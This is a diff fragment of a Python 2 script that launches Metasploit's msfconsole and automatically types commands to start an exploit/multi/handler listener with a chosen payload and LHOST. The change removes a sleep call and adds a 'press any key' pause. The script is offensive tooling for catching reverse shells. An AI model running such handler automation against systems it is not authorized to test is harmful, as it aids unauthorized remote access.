@@ -14,7 +14,6 @@ exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
 exploitTwo = exploit.lower()
 
 os.system("msfconsole")
-time.sleep(10)
 keyboard.type("use exploit/multi/handler")
 keyboard.type("set payload " + payload)
 keyboard.type("set LHOST " + ip)
@@ -26,6 +25,10 @@ elif exploitTwo == "n":
     pass
 else:
     print("That is not a valid response.")
+
+print("")
+print("")
+raw_input("Press any key to continue...")
 
 
 # os.system("msfconsole")
